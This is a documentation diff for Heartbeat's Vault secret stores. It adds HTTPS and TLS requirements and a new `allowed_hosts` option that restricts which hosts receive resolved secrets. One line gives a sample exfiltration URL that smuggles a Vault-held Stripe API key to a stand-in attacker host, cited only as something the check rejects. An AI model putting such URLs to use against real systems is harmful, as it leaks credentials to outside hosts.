@@ -159,7 +159,7 @@ Each `secret_stores` entry takes these options:
 :   The name that references use to select this entry, as in `vault://prod@my-app/api#token`. Names must be unique.
 
 `address`
-:   The URL of the Vault server.
+:   The URL of the Vault server. Non-loopback addresses must use `https`. Plain HTTP is allowed only for `localhost`, IPv4 addresses in `127.0.0.0/8`, and the IPv6 address `::1`.
 
 `namespace`
 :   (Optional) The Vault Enterprise namespace.
@@ -174,7 +174,10 @@ Each `secret_stores` entry takes these options:
     * `approle`: AppRole credentials: `role_id`, `secret_id`, and optionally `mount_path`, which defaults to `approle`.
 
 `ssl`
-:   (Optional) TLS settings of the connection to Vault, such as `certificate_authorities` to trust a private CA. They only apply to Vault: the `ssl` settings of the monitor apply to the monitored host. See [SSL](/reference/heartbeat/configuration-ssl.md) for the available settings.
+:   (Optional) TLS settings of the connection to Vault. You can set `certificate_authorities` to trust a private CA. For a non-loopback Vault address, `verification_mode` must be `full` (the default) or `strict`. These settings only apply to Vault: the `ssl` settings of the monitor apply to the monitored host. See [SSL](/reference/heartbeat/configuration-ssl.md) for the available settings.
+
+`allowed_hosts`
+:   (Optional) The hosts that the secrets of this connection can be sent to, as host names or IP addresses, without scheme, port, or path. Refer to [Restrict the hosts that receive secrets](#monitor-secret-stores-allowed-hosts). If you don't set this option, or set it to an empty list, any host can receive the secrets.
 
 Heartbeat resolves the references before each run. A secret is read from Vault at most once every 5 minutes and shared by the monitors that use the same connection, so rotated secrets are used within 5 minutes without changing the monitor. On runs that read from Vault, the monitor duration includes the time of the read.
 
@@ -187,6 +190,67 @@ If a monitor with several URLs or hosts starts while Vault is unavailable, or if
 ::::{warning}
 Heartbeat uses the resolved values as they are. A secret in a setting that is published in events, such as a URL or a host, is visible in those events, for example in `url.full`, `url.query`, or `error.message`, as with any other secret in the configuration. Use settings that are not published for secrets, such as `username`, `password`, request headers, or TLS settings.
 ::::
+
+### Restrict the hosts that receive secrets [monitor-secret-stores-allowed-hosts]
+
+```{applies_to}
+stack: preview 9.6+
+```
+
+Use `allowed_hosts` to make sure the secrets of a connection are only sent to hosts you approve, regardless of who writes the monitors that use the connection.
+
+::::{note}
+This protection only holds if monitor authors can't change the `secret_stores` setting, for example when Kibana adds it to the monitors. If the same person writes both the monitor and its `secret_stores`, as in a standalone `heartbeat.yml`, they can remove `allowed_hosts` or add their own connection.
+::::
+
+Before each run, Heartbeat resolves the references and then checks the resolved monitor configuration. A monitor that fails the check doesn't run and reports `down` with an error such as:
+
+```
+secret_stores: connection "prod": not allowed by allowed_hosts: the monitor connects to a host that is not allowed
+```
+
+The error doesn't name the host, because a host can come from a secret.
+
+A monitor that lists the connection in `secret_stores` but doesn't reference it is not checked.
+
+A monitor that references a connection with `allowed_hosts` runs only if all of these conditions are met:
+
+* It's an `http`, `tcp`, or `icmp` monitor. Browser monitors can't use the connection, because their scripts can send the secrets to any host.
+* Every host it connects to is in `allowed_hosts`. This includes the hosts in `urls` or `hosts` and, if set, the host in `proxy_url`.
+* For `http` monitors, `max_redirects` is `0`, which is the default. A redirect can send the request to any host.
+* For `http` monitors, `kerberos` isn't set. Kerberos sends data derived from the password to the Kerberos servers (KDCs), which aren't checked.
+
+Hosts are compared as follows:
+
+* Host names are compared case-insensitively and without a trailing dot. They aren't resolved, so allowing a name doesn't allow its IP addresses.
+* Ports are ignored, so `api.example.com` allows `https://api.example.com:8443`.
+* IP addresses are compared as addresses, so `::1` allows `[0:0:0:0:0:0:0:1]`.
+* Internationalized host names are compared in their ASCII (Punycode) form, so `bücher.example` allows `xn--bcher-kva.example`.
+* Wildcards aren't supported.
+
+Heartbeat checks the hosts after it resolves the references, so it checks the hosts the monitor actually connects to, including hosts that come from secrets. For example, `https://attacker.example/?k=vault://prod@payments/stripe#api_key` is rejected because `attacker.example` isn't allowed.
+
+Because of this order, a monitor that fails the check still reads its secrets from Vault, at most once every 5 minutes for each secret. These reads appear in the Vault audit log. The secrets stay in Heartbeat and aren't sent to any host.
+
+In this example, the secrets of the `prod` connection can only be sent to `api.stripe.com`:
+
+```yaml
+- type: http
+  id: stripe-charges
+  schedule: '@every 1m'
+  urls: ["https://api.stripe.com/v1/charges"]
+  check.request.headers:
+    Authorization: "Bearer vault://prod@payments/stripe#api_key"
+  secret_stores:
+    - type: vault
+      name: prod
+      address: https://vault.example.com:8200
+      auth:
+        token: my-token
+      allowed_hosts: ["api.stripe.com"]
+```
+
+`allowed_hosts` restricts where secrets are sent, not who can see them. A secret in a setting that Heartbeat publishes is visible in events, as described in the [`secret_stores`](#monitor-secret-stores) warning.
 
 
 ## `fields` [monitor-fields]
